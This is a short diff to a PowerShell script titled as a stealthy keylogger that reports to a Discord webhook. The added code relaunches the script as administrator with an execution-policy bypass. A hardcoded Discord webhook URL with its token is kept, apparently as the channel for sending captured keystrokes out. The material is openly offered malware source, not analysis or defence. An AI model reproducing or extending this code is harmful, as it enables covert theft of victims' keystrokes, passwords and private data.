@@ -1,4 +1,20 @@
-# Stealthy PowerShell Keylogger with Discord Webhook
+# Stealthy PowerShell Keylogger with Discord Webhook 
+
+# Function to Restart Script as Admin
+function Restart-AsAdmin {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    
+    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        $scriptPath = $PSCommandPath
+        $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
+        Start-Process powershell -Verb RunAs -ArgumentList $arguments
+        exit
+    }
+}
+
+# Run the function to check for admin rights
+Restart-AsAdmin
 
 # Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv"
